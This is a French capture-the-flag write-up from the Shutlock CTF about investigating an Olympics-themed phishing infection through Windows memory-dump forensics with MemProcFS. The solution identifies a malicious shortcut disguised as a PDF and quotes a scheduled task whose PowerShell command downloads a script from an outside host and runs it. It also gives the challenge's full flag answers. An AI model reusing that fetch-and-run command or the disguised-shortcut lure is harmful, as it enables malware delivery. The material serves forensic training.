## Description

### Enquête sur le phishing des JO : Retracer l'attaque Partie 1
Mike O'Soft a été averti d'une campagne de phishing par le groupe THE HAMOR. Une des personnes ayant reçu le mail de phishing en question, s'est faite avoir. 

Vous avez pour mission de réaliser l'enquête. Heureusement pour vous, les équipes du ministère ont réalisé un dump mémoire sur la machine. Dans la suite de votre enquête, un dump réseau vous sera confié. 

Sauriez-vous retracer ce qu'il s'est passé sur ce poste ? 

Pour résoudre ce challenge, vous devez répondre aux questions suivantes : 

1 - Quel est le nom du raccourci malveillant ?

2 - Quel est le nom de la scheduled task créée ?

3 - Quel script est lancé par cette scheduled task ?

#### Format du flag

**SHLK{'nom-fichier'-'scheduled task-'script'}**

#### Exemple

1 - File : ctf\shutlock.test

2 - scheduled task : ScheduleTaskName

3 - script : ThisIsTheScript.sh

**SHLK{shutlock.test-ScheduleTaskName-ThisIsTheScript.sh}**


#### SHA256

dump.raw : 757D150394158D68F33D25A46EF45D6874FE046A40DA7E97C3C0D33DF21EB7E1

dump.zip : 3C6DA179B87FA2DC0ACB988466428679FD6AF0905F004A56E8A968A83009E16D

## Objectif de la création de ce challenge

Ce challenge a été créé pour la première édition du CTF Shutlock.

Il a été réalisé afin de permettre une introduction à l'analyse de timeline et de dump mémoire.

## Solve

### TL;DR

- Analyse du système de fichiers pour trouver le script malveillant
- Analyse des tasks créées

### Informations trouvées grâce à l'énoncé

- Mail de phishing

Fichiers donnés : 

- `dump.raw` : dump mémoire de l'ordinateur infecté (Windows 10)
- `ordi.png` : screenshot de l'ordinateur infecté

### Informations trouvées grâce à ordi.png

Information sur les processus en cours et malveillants 
- Notepad : instructions.txt
- Edge : Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf

Permets d'avoir une idée de l'heure à laquelle l'attaque a eu lieu.

### Etude

- Utilisation de l'outil [MemProcFS](https://github.com/ufrisk/MemProcFS)

```bash
MemProcFS.exe -forensic 1 -device dump.raw
```

- **Quel est le nom du fichier malveillant ?**

L'accès initial étant un mail de phishing, on regarde son système de fichiers pour voir s'il n'a pas téléchargé le fichier malveillant.

Visible dans `M:\forensic\ntfs\1\Users\clara\Downloads\`
On remarque qu'il a téléchargé *Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.zip*.

Ce zip extrait le fichier `Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf` ayant pour type `raccourci`.

Première partie du flag : `Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf.lnk`

- **Quel est le nom de la scheduled task créée ?**

On utilise le fichier visible dans `M:\forensic\csv\tasks.csv`. On va analyser dans timeline explorer (fichier .tle_sess)

On voit la première task `IGotYourFileInfo` ayant pour ligne de commande `Invoke-WebRequest` et pour paramètre `-Uri http://172.21.195.17:5000/Holmes/GetFileInfo.ps1 -OutFile GetFilesInfo.ps1 ; Start-Process -FilePath GetFilesInfo.ps1`

On vérifie dans `M:\forensic\csv\timeline_tasks.csv` que la task a été créée.

Deuxième partie du flag : `IGotYourFileInfo`

- **Quel script est lancé par cette scheduled task ?**

````powershell
IGotYourFileInfo - [Invoke-WebRequest :: -Uri http://172.21.195.17:5000/Holmes/GetFileInfo.ps1 -OutFile GetFilesInfo.ps1 ; Start-Process -FilePath GetFilesInfo.ps1] (Author)
````

Le script lancé est le paramètre de *-OutFile*

Troisième partie du flag : GetFilesInfo.ps1